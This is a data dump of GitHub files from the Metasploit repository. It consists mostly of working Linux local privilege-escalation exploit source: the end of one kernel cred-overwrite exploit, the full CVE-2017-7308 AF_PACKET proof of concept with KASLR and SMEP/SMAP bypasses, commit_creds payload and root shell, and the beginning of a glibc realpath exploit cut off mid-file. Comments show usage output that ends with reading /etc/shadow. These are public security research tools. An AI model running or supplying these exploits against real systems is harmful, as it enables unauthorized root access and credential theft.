PHYS_OFFSET){\n\t\tfail(\"Failed to find Sock address from sk_buff.\\n\");\n\t}\t\n\t\t\n\t/*\n\t * scan forward for expected sk_rcvtimeo value.\n\t *\n\t * struct sock {\n\t *    [...]\n\t *    const struct cred      *sk_peer_cred; \n\t *    long                    sk_rcvtimeo;             \n\t *  };\n\t */\n\tfor (int i = 0; i < 100; i++, sock_addr += 8) {\n\t\tif(read64(sock_addr) == 0x7FFFFFFFFFFFFFFF) {\n\t\t\tunsigned long cred_struct = read64(sock_addr - 8);\n\t\t\tif(cred_struct < PHYS_OFFSET) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tunsigned long test_uid = (read64(cred_struct + sizeof(int)) & 0xFFFFFFFF);\n\t\t\t\n\t\t\tif(test_uid != uid) {\n\t\t\t\tcontinue;\n\t\t\t}\n                        msg(\"Sock->sk_rcvtimeo at offset %d\\n\", i * 8);\n                        msg(\"Cred structure at %llx\\n\", cred_struct);\n\t\t\tmsg(\"UID from cred structure: %d, matches the current: %d\\n\", test_uid, uid);\n\t\t\t\n\t\t\treturn cred_struct;\n\t\t}\n\t}\n\tfail(\"failed to find sk_rcvtimeo.\\n\");\n}\n\nstatic void\nhammer_cred(unsigned long addr) {\n\tmsg(\"hammering cred structure at %llx\\n\", addr);\n#define w64(w) { write64(addr, (w)); addr += 8; }\n\tunsigned long val = read64(addr) & 0xFFFFFFFFUL;\n\tw64(val); \n\tw64(0); w64(0); w64(0); w64(0);\n\tw64(0xFFFFFFFFFFFFFFFF); \n\tw64(0xFFFFFFFFFFFFFFFF); \n\tw64(0xFFFFFFFFFFFFFFFF); \n#undef w64\n}\n\nint\nmain(int argc, char **argv) {\n\tinitialize();\n\thammer_cred(find_cred());\n\tmsg(\"credentials patched, launching shell...\\n\");\n\tif(execl(\"/bin/sh\", \"/bin/sh\", NULL)) {\n\t\tfail(\"exec %s\\n\", strerror(errno));\n\t}\n}\n\n", "timestamp": "2025-10-24T23:42:03.390517"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2017-7308/poc.c", "content": "// A proof-of-concept local root exploit for CVE-2017-7308.\n// Includes a SMEP & SMAP bypass.\n// Tested on Ubuntu / Linux Mint:\n// - 4.8.0-34-generic\n// - 4.8.0-36-generic\n// - 4.8.0-39-generic\n// - 4.8.0-41-generic\n// - 4.8.0-42-generic\n// - 4.8.0-44-generic\n// - 4.8.0-45-generic\n// https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308\n//\n// Usage:\n// user@ubuntu:~$ uname -a\n// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...\n// user@ubuntu:~$ gcc pwn.c -o pwn\n// user@ubuntu:~$ ./pwn \n// [.] starting\n// [.] system has 2 processors\n// [.] checking kernel version\n// [.] kernel version '4.8.0-41-generic' detected\n// [~] done, version looks good\n// [.] checking SMEP and SMAP\n// [~] done, looks good\n// [.] setting up namespace sandbox\n// [~] done, namespace sandbox set up\n// [.] KASLR bypass enabled, getting kernel addr\n// [.] done, kernel text:   ffffffff87000000\n// [.] commit_creds:        ffffffff870a5cf0\n// [.] prepare_kernel_cred: ffffffff870a60e0\n// [.] native_write_cr4:    ffffffff87064210\n// [.] padding heap\n// [.] done, heap is padded\n// [.] SMEP & SMAP bypass enabled, turning them off\n// [.] done, SMEP & SMAP should be off now\n// [.] executing get root payload 0x401516\n// [.] done, should be root now\n// [.] checking if we got root\n// [+] got r00t ^_^\n// root@ubuntu:/home/user# cat /etc/shadow\n// root:!:17246:0:99999:7:::\n// daemon:*:17212:0:99999:7:::\n// bin:*:17212:0:99999:7:::\n// ...\n//\n// Andrey Konovalov <andreyknvl@gmail.com>\n// ---\n// Updated by <bcoles@gmail.com>\n// - support for systems with SMEP but no SMAP\n// - check number of CPU cores\n// - additional kernel targets\n// - additional KASLR bypasses\n// https://github.com/bcoles/kernel-exploits/tree/cve-2017-7308\n\n#define _GNU_SOURCE\n\n#include <assert.h>\n#include <fcntl.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sched.h>\n\n#include <sys/ioctl.h>\n#include <sys/klog.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n#include <sys/sysinfo.h>\n#include <sys/types.h>\n#include <sys/utsname.h>\n#include <sys/wait.h>\n\n#include <arpa/inet.h>\n#include <linux/if_packet.h>\n#include <linux/ip.h>\n#include <linux/udp.h>\n#include <netinet/if_ether.h>\n#include <net/if.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#       define dprintf printf\n#else\n#       define dprintf\n#endif\n\n#define ENABLE_KASLR_BYPASS\t\t1\n#define ENABLE_SMEP_SMAP_BYPASS\t\t1\n\nchar *SHELL = \"/bin/bash\";\n\n// Will be overwritten if ENABLE_KASLR_BYPASS\nunsigned long KERNEL_BASE = \t\t0xffffffff81000000ul;\n\n// Will be overwritten by detect_versions().\nint kernel = -1;\n\nstruct kernel_info {\n\tconst char* version;\n\tuint64_t commit_creds;\n\tuint64_t prepare_kernel_cred;\n\tuint64_t native_write_cr4;\n};\n\nstruct kernel_info kernels[] = {\n\t{ \"4.8.0-34-generic\", 0xa5d50, 0xa6140, 0x64210 },\n\t{ \"4.8.0-36-generic\", 0xa5d50, 0xa6140, 0x64210 },\n\t{ \"4.8.0-39-generic\", 0xa5cf0, 0xa60e0, 0x64210 },\n\t{ \"4.8.0-41-generic\", 0xa5cf0, 0xa60e0, 0x64210 },\n\t{ \"4.8.0-42-generic\", 0xa5cf0, 0xa60e0, 0x64210 },\n\t{ \"4.8.0-44-generic\", 0xa5cf0, 0xa60e0, 0x64210 },\n\t{ \"4.8.0-45-generic\", 0xa5cf0, 0xa60e0, 0x64210 },\n};\n\n// Used to get root privileges.\n#define COMMIT_CREDS\t\t\t(KERNEL_BASE + kernels[kernel].commit_creds)\n#define PREPARE_KERNEL_CRED\t\t(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)\n#define NATIVE_WRITE_CR4\t\t(KERNEL_BASE + kernels[kernel].native_write_cr4)\n\n// Will be overwritten if ENABLE_SMEP_SMAP_BYPASS\nunsigned long CR4_DESIRED_VALUE =\t0x406e0ul;\n\n#define KMALLOC_PAD\t\t\t512\n#define PAGEALLOC_PAD\t\t\t1024\n\n// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *\n\ntypedef uint32_t u32;\n\n// $ pahole -C hlist_node ./vmlinux\nstruct hlist_node {\n\tstruct hlist_node *        next;                 /*     0     8 */\n\tstruct hlist_node * *      pprev;                /*     8     8 */\n};\n\n// $ pahole -C timer_list ./vmlinux\nstruct timer_list {\n\tstruct hlist_node          entry;                /*     0    16 */\n\tlong unsigned int          expires;              /*    16     8 */\n\tvoid                       (*function)(long unsigned int); /*    24     8 */\n\tlong unsigned int          data;                 /*    32     8 */\n\tu32                        flags;                /*    40     4 */\n\tint                        start_pid;            /*    44     4 */\n\tvoid *                     start_site;           /*    48     8 */\n\tchar                       start_comm[16];       /*    56    16 */\n};\n\n// packet_sock->rx_ring->prb_bdqc->retire_blk_timer\n#define TIMER_OFFSET\t896\n\n// pakcet_sock->xmit\n#define XMIT_OFFSET\t1304\n\n// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *\n\nvoid packet_socket_rx_ring_init(int s, unsigned int block_size,\n\t\tunsigned int frame_size, unsigned int block_nr,\n\t\tunsigned int sizeof_priv, unsigned int timeout) {\n\tint v = TPACKET_V3;\n\tint rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));\n\tif (rv < 0) {\n\t\tdprintf(\"[-] setsockopt(PACKET_VERSION)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tstruct tpacket_req3 req;\n\tmemset(&req, 0, sizeof(req));\n\treq.tp_block_size = block_size;\n\treq.tp_frame_size = frame_size;\n\treq.tp_block_nr = block_nr;\n\treq.tp_frame_nr = (block_size * block_nr) / frame_size;\n\treq.tp_retire_blk_tov = timeout;\n\treq.tp_sizeof_priv = sizeof_priv;\n\treq.tp_feature_req_word = 0;\n\n\trv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));\n\tif (rv < 0) {\n\t\tdprintf(\"[-] setsockopt(PACKET_RX_RING)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\nint packet_socket_setup(unsigned int block_size, unsigned int frame_size,\n\t\tunsigned int block_nr, unsigned int sizeof_priv, int timeout) {\n\tint s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n\tif (s < 0) {\n\t\tdprintf(\"[-] socket(AF_PACKET)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tpacket_socket_rx_ring_init(s, block_size, frame_size, block_nr,\n\t\tsizeof_priv, timeout);\n\n\tstruct sockaddr_ll sa;\n\tmemset(&sa, 0, sizeof(sa));\n\tsa.sll_family = PF_PACKET;\n\tsa.sll_protocol = htons(ETH_P_ALL);\n\tsa.sll_ifindex = if_nametoindex(\"lo\");\n\tsa.sll_hatype = 0;\n\tsa.sll_pkttype = 0;\n\tsa.sll_halen = 0;\n\n\tint rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));\n\tif (rv < 0) {\n\t\tdprintf(\"[-] bind(AF_PACKET)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\treturn s;\n}\n\nvoid packet_socket_send(int s, char *buffer, int size) {\n\tstruct sockaddr_ll sa;\n\tmemset(&sa, 0, sizeof(sa));\n\tsa.sll_ifindex = if_nametoindex(\"lo\");\n\tsa.sll_halen = ETH_ALEN;\n\n\tif (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,\n\t\t\tsizeof(sa)) < 0) {\n\t\tdprintf(\"[-] sendto(SOCK_RAW)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\nvoid loopback_send(char *buffer, int size) {\n\tint s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (s == -1) {\n\t\tdprintf(\"[-] socket(SOCK_RAW)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tpacket_socket_send(s, buffer, size);\n}\n\nint packet_sock_kmalloc() {\n\tint s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));\n\tif (s == -1) {\n\t\tdprintf(\"[-] socket(SOCK_DGRAM)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\treturn s;\n}\n\nvoid packet_sock_timer_schedule(int s, int timeout) {\n\tpacket_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);\n}\n\nvoid packet_sock_id_match_trigger(int s) {\n\tchar buffer[16];\n\tpacket_socket_send(s, &buffer[0], sizeof(buffer));\n}\n\n// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *\n\n#define ALIGN(x, a)\t\t\t__ALIGN_KERNEL((x), (a))\n#define __ALIGN_KERNEL(x, a)\t\t__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)\n#define __ALIGN_KERNEL_MASK(x, mask)\t(((x) + (mask)) & ~(mask))\n\n#define V3_ALIGNMENT\t(8)\n#define BLK_HDR_LEN\t(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))\n\n#define ETH_HDR_LEN\tsizeof(struct ethhdr)\n#define IP_HDR_LEN\tsizeof(struct iphdr)\n#define UDP_HDR_LEN\tsizeof(struct udphdr)\n\n#define UDP_HDR_LEN_FULL\t(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)\n\nint oob_setup(int offset) {\n\tunsigned int maclen = ETH_HDR_LEN;\n\tunsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +\n\t\t\t\t(maclen < 16 ? 16 : maclen));\n\tunsigned int macoff = netoff - maclen;\n\tunsigned int sizeof_priv = (1u<<31) + (1u<<30) +\n\t\t0x8000 - BLK_HDR_LEN - macoff + offset;\n\treturn packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);\n}\n\nvoid oob_write(char *buffer, int size) {\n\tloopback_send(buffer, size);\n}\n\nvoid oob_timer_execute(void *func, unsigned long arg) {\n\toob_setup(2048 + TIMER_OFFSET - 8);\n\n\tint i;\n\tfor (i = 0; i < 32; i++) {\n\t\tint timer = packet_sock_kmalloc();\n\t\tpacket_sock_timer_schedule(timer, 1000);\n\t}\n\n\tchar buffer[2048];\n\tmemset(&buffer[0], 0, sizeof(buffer));\n\n\tstruct timer_list *timer = (struct timer_list *)&buffer[8];\n\ttimer->function = func;\n\ttimer->data = arg;\n\ttimer->flags = 1;\n\n\toob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);\n\n\tsleep(1);\n}\n\nvoid oob_id_match_execute(void *func) {\n\tint s = oob_setup(2048 + XMIT_OFFSET - 64);\n\n\tint ps[32];\n\n\tint i;\n\tfor (i = 0; i < 32; i++)\n\t\tps[i] = packet_sock_kmalloc();\n\n\tchar buffer[2048];\n\tmemset(&buffer[0], 0, 2048);\n\n\tvoid **xmit = (void **)&buffer[64];\n\t*xmit = func;\n\n\toob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);\n\n\tfor (i = 0; i < 32; i++)\n\t\tpacket_sock_id_match_trigger(ps[i]);\n}\n\n// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *\n\nvoid kmalloc_pad(int count) {\n\tint i;\n\tfor (i = 0; i < count; i++)\n\t\tpacket_sock_kmalloc();\n}\n\nvoid pagealloc_pad(int count) {\n\tpacket_socket_setup(0x8000, 2048, count, 0, 100);\n}\n\n// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *\n\ntypedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);\ntypedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);\n\nvoid get_root_payload(void) {\n\t((_commit_creds)(COMMIT_CREDS))(\n\t\t((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)\n\t);\n}\n\n// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *\n\n#define CHUNK_SIZE 1024\n\nint read_file(const char* file, char* buffer, int max_length) {\n\tint f = open(file, O_RDONLY);\n\tif (f == -1)\n\t\treturn -1;\n\tint bytes_read = 0;\n\twhile (true) {\n\t\tint bytes_to_read = CHUNK_SIZE;\n\t\tif (bytes_to_read > max_length - bytes_read)\n\t\t\tbytes_to_read = max_length - bytes_read;\n\t\tint rv = read(f, &buffer[bytes_read], bytes_to_read);\n\t\tif (rv == -1)\n\t\t\treturn -1;\n\t\tbytes_read += rv;\n\t\tif (rv == 0)\n\t\t\treturn bytes_read;\n\t}\n}\n\nvoid get_kernel_version(char* output, int max_length) {\n        struct utsname u;\n        int rv = uname(&u);\n        if (rv != 0) {\n                dprintf(\"[-] uname())\\n\");\n                exit(EXIT_FAILURE);\n        }\n        assert(strlen(u.release) <= max_length);\n        strcpy(&output[0], u.release);\n}\n\n#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))\n\n#define KERNEL_VERSION_LENGTH 32\n\nvoid detect_versions() {\n\tchar version[KERNEL_VERSION_LENGTH];\n\n\tget_kernel_version(&version[0], KERNEL_VERSION_LENGTH);\n\n\tint i;\n\tfor (i = 0; i < ARRAY_SIZE(kernels); i++) {\n\t\tif (strcmp(&version[0], kernels[i].version) == 0) {\n\t\t\tdprintf(\"[.] kernel version '%s' detected\\n\", kernels[i].version);\n\t\t\tkernel = i;\n\t\t\treturn;\n\t\t}\n\t}\n\n\tdprintf(\"[-] kernel version not recognized\\n\");\n\texit(EXIT_FAILURE);\n}\n\n#define PROC_CPUINFO_LENGTH 4096\n\n// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP\nint smap_smep_enabled() {\n\tchar buffer[PROC_CPUINFO_LENGTH];\n\tchar* path = \"/proc/cpuinfo\";\n\tint length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);\n\tif (length == -1) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tint rv = 0;\n\tchar* found = memmem(&buffer[0], length, \"smep\", 4);\n\tif (found != NULL)\n\t\trv += 1;\n\tfound = memmem(&buffer[0], length, \"smap\", 4);\n\tif (found != NULL)\n\t\trv += 2;\n\treturn rv;\n}\n\nvoid check_smep_smap() {\n\tint rv = smap_smep_enabled();\n\n#if !ENABLE_SMEP_SMAP_BYPASS\n\tif (rv >= 1) {\n\t\tdprintf(\"[-] SMAP/SMEP detected, use ENABLE_SMEP_SMAP_BYPASS\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n#endif\n\n\tswitch(rv) {\n\tcase 1: // SMEP\n\t\tCR4_DESIRED_VALUE = 0x406e0ul;\n\t\tbreak;\n\tcase 2: // SMAP\n\t\tCR4_DESIRED_VALUE = 0x407f0ul;\n\t\tbreak;\n\tcase 3: // SMEP and SMAP\n\t\tCR4_DESIRED_VALUE = 0x407f0ul;\n\t\tbreak;\n\t}\n}\n\n// * * * * * * * * * * * * * Syslog KASLR bypass * * * * * * * * * * * * * * *\n\n#define SYSLOG_ACTION_READ_ALL 3\n#define SYSLOG_ACTION_SIZE_BUFFER 10\n\nunsigned long get_kernel_addr_syslog() {\n\tdprintf(\"[.] trying syslog...\\n\");\n\n\tint size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);\n\tif (size == -1) {\n\t\tdprintf(\"[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tsize = (size / getpagesize() + 1) * getpagesize();\n\tchar *buffer = (char *)mmap(NULL, size, PROT_READ|PROT_WRITE,\n\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\n\tsize = klogctl(SYSLOG_ACTION_READ_ALL, &buffer[0], size);\n\tif (size == -1) {\n\t\tdprintf(\"[-] klogctl(SYSLOG_ACTION_READ_ALL)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tconst char *needle1 = \"Freeing SMP\";\n\tchar *substr = (char *)memmem(&buffer[0], size, needle1, strlen(needle1));\n\tif (substr == NULL) {\n\t\tdprintf(\"[-] substring '%s' not found in dmesg\\n\", needle1);\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tfor (size = 0; substr[size] != '\\n'; size++);\n\n\tconst char *needle2 = \"ffff\";\n\tsubstr = (char *)memmem(&substr[0], size, needle2, strlen(needle2));\n\tif (substr == NULL) {\n\t\tdprintf(\"[-] substring '%s' not found in dmesg\\n\", needle2);\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tchar *endptr = &substr[16];\n\tunsigned long r = strtoul(&substr[0], &endptr, 16);\n\n\tr &= 0xfffffffffff00000ul;\n\tr -= 0x1000000ul;\n\n\treturn r;\n}\n\n// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr_kallsyms() {\n\tFILE *f;\n\tunsigned long addr = 0;\n\tchar dummy;\n\tchar sname[256];\n\tchar* name = \"startup_64\";\n\tchar* path = \"/proc/kallsyms\";\n\n\tdprintf(\"[.] trying %s...\\n\", path);\n\tf = fopen(path, \"r\");\n\tif (f == NULL) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\treturn 0;\n\t}\n\n\tint ret = 0;\n\twhile (ret != EOF) {\n\t\tret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n\t\tif (ret == 0) {\n\t\t\tfscanf(f, \"%s\\n\", sname);\n\t\t\tcontinue;\n\t\t}\n\t\tif (!strcmp(name, sname)) {\n\t\t\tfclose(f);\n\t\t\treturn addr;\n\t\t}\n\t}\n\n\tfclose(f);\n\tdprintf(\"[-] kernel base not found in %s\\n\", path);\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * System.map KASLR bypass * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr_sysmap() {\n\tFILE *f;\n\tunsigned long addr = 0;\n\tchar path[512] = \"/boot/System.map-\";\n\tchar version[32];\n\tget_kernel_version(&version[0], 32);\n\tstrcat(path, &version[0]);\n\tdprintf(\"[.] trying %s...\\n\", path);\n\tf = fopen(path, \"r\");\n\tif (f == NULL) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\treturn 0;\n\t}\n\n\tchar dummy;\n\tchar sname[256];\n\tchar* name = \"startup_64\";\n\tint ret = 0;\n\twhile (ret != EOF) {\n\t\tret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n\t\tif (ret == 0) {\n\t\t\tfscanf(f, \"%s\\n\", sname);\n\t\t\tcontinue;\n\t\t}\n\t\tif (!strcmp(name, sname)) {\n\t\t\tfclose(f);\n\t\t\treturn addr;\n\t\t}\n\t}\n\n\tfclose(f);\n\tdprintf(\"[-] kernel base not found in %s\\n\", path);\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr() {\n\tunsigned long addr = 0;\n\n\taddr = get_kernel_addr_kallsyms();\n        if (addr) return addr;\n\n\taddr = get_kernel_addr_sysmap();\n\tif (addr) return addr;\n\n\taddr = get_kernel_addr_syslog();\n\tif (addr) return addr;\n\n\tdprintf(\"[-] KASLR bypass failed\\n\");\n\texit(EXIT_FAILURE);\n\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *\n\nvoid check_procs() {\n\tint min_procs = 2;\n\n\tint nprocs = 0;\n\tnprocs = get_nprocs_conf();\n\n\tif (nprocs < min_procs) {\n\t\tdprintf(\"[-] system has less than %d processor cores\\n\", min_procs);\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tdprintf(\"[.] system has %d processors\\n\", nprocs);\n}\n\nvoid exec_shell() {\n\tint fd;\n\n\tfd = open(\"/proc/1/ns/net\", O_RDONLY);\n\tif (fd == -1) {\n\t\tdprintf(\"error opening /proc/1/ns/net\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (setns(fd, CLONE_NEWNET) == -1) {\n\t\tdprintf(\"error calling setns\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tsystem(SHELL);\n}\n\nvoid fork_shell() {\n\tpid_t rv;\n\n\trv = fork();\n\tif (rv == -1) {\n\t\tdprintf(\"[-] fork()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (rv == 0) {\n\t\texec_shell();\n\t}\n}\n\nbool is_root() {\n\t// We can't simple check uid, since we're running inside a namespace\n\t// with uid set to 0. Try opening /etc/shadow instead.\n\tint fd = open(\"/etc/shadow\", O_RDONLY);\n\tif (fd == -1)\n\t\treturn false;\n\tclose(fd);\n\treturn true;\n}\n\nvoid check_root() {\n\tdprintf(\"[.] checking if we got root\\n\");\n\n\tif (!is_root()) {\n\t\tdprintf(\"[-] something went wrong =(\\n\");\n\t\treturn;\n\t}\n\n\tdprintf(\"[+] got r00t ^_^\\n\");\n\n\t// Fork and exec instead of just doing the exec to avoid potential\n\t// memory corruptions when closing packet sockets.\n\tfork_shell();\n}\n\nbool write_file(const char* file, const char* what, ...) {\n\tchar buf[1024];\n\tva_list args;\n\tva_start(args, what);\n\tvsnprintf(buf, sizeof(buf), what, args);\n\tva_end(args);\n\tbuf[sizeof(buf) - 1] = 0;\n\tint len = strlen(buf);\n\n\tint fd = open(file, O_WRONLY | O_CLOEXEC);\n\tif (fd == -1)\n\t\treturn false;\n\tif (write(fd, buf, len) != len) {\n\t\tclose(fd);\n\t\treturn false;\n\t}\n\tclose(fd);\n\treturn true;\n}\n\nvoid setup_sandbox() {\n\tint real_uid = getuid();\n\tint real_gid = getgid();\n\n        if (unshare(CLONE_NEWUSER) != 0) {\n\t\tdprintf(\"[-] unshare(CLONE_NEWUSER)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n        if (unshare(CLONE_NEWNET) != 0) {\n\t\tdprintf(\"[-] unshare(CLONE_NEWUSER)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (!write_file(\"/proc/self/setgroups\", \"deny\")) {\n\t\tdprintf(\"[-] write_file(/proc/self/set_groups)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (!write_file(\"/proc/self/uid_map\", \"0 %d 1\\n\", real_uid)){\n\t\tdprintf(\"[-] write_file(/proc/self/uid_map)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (!write_file(\"/proc/self/gid_map\", \"0 %d 1\\n\", real_gid)) {\n\t\tdprintf(\"[-] write_file(/proc/self/gid_map)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tcpu_set_t my_set;\n\tCPU_ZERO(&my_set);\n\tCPU_SET(0, &my_set);\n\tif (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {\n\t\tdprintf(\"[-] sched_setaffinity()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (system(\"/sbin/ifconfig lo up\") != 0) {\n\t\tdprintf(\"[-] system(/sbin/ifconfig lo up)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\nint main(int argc, char *argv[]) {\n\tif (argc > 1) SHELL = argv[1];\n\n\tdprintf(\"[.] starting\\n\");\n\n\tcheck_procs();\n\n\tdprintf(\"[.] checking kernel version\\n\");\n\tdetect_versions();\n\tdprintf(\"[~] done, version looks good\\n\");\n\n\tdprintf(\"[.] checking SMEP and SMAP\\n\");\n\tcheck_smep_smap();\n\tdprintf(\"[~] done, looks good\\n\");\n\n\tpid_t pid = fork();\n\tif (pid == -1) {\n\t\tdprintf(\"[-] fork()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (pid != 0) {\n\t\tdprintf(\"[.] performing exploit...\\n\");\n\t\treturn 0;\n\t}\n\n\tdprintf(\"[.] setting up namespace sandbox\\n\");\n\tsetup_sandbox();\n\tdprintf(\"[~] done, namespace sandbox set up\\n\");\n\n#if ENABLE_KASLR_BYPASS\n\tdprintf(\"[.] KASLR bypass enabled, getting kernel addr\\n\");\n\tKERNEL_BASE = get_kernel_addr();\n\tdprintf(\"[.] done, kernel text:   %lx\\n\", KERNEL_BASE);\n#endif\n\n\tdprintf(\"[.] commit_creds:        %lx\\n\", COMMIT_CREDS);\n\tdprintf(\"[.] prepare_kernel_cred: %lx\\n\", PREPARE_KERNEL_CRED);\n\n#if ENABLE_SMEP_SMAP_BYPASS\n\tdprintf(\"[.] native_write_cr4:    %lx\\n\", NATIVE_WRITE_CR4);\n#endif\n\n\tdprintf(\"[.] padding heap\\n\");\n\tkmalloc_pad(KMALLOC_PAD);\n\tpagealloc_pad(PAGEALLOC_PAD);\n\tdprintf(\"[.] done, heap is padded\\n\");\n\n#if ENABLE_SMEP_SMAP_BYPASS\n\tdprintf(\"[.] SMEP & SMAP bypass enabled, turning them off\\n\");\n\toob_timer_execute((void *)(NATIVE_WRITE_CR4), CR4_DESIRED_VALUE);\n\tdprintf(\"[.] done, SMEP & SMAP should be off now\\n\");\n#endif\n\n\tdprintf(\"[.] executing get root payload %p\\n\", &get_root_payload);\n\toob_id_match_execute((void *)&get_root_payload);\n\tdprintf(\"[.] done, should be root now\\n\");\n\n\tcheck_root();\n\n\twhile (1) sleep(1000);\n\n\treturn 0;\n}\n", "timestamp": "2025-10-24T23:42:03.720223"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2018-1000001/RationalLove.c", "content": "/** This software is provided by the copyright owner \"as is\" and any\n *  expressed or implied warranties, including, but not limited to,\n *  the implied warranties of merchantability and fitness for a particular\n *  purpose are disclaimed. In no event shall the copyright owner be\n *  liable for any direct, indirect, incidential, special, exemplary or\n *  consequential damages, including, but not limited to, procurement\n *  of substitute goods or services, loss of use, data or profits or\n *  business interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including negligence\n *  or otherwise, arising in any way out of the use of this software,\n *  even if advised of the possibility of such damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n */\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; 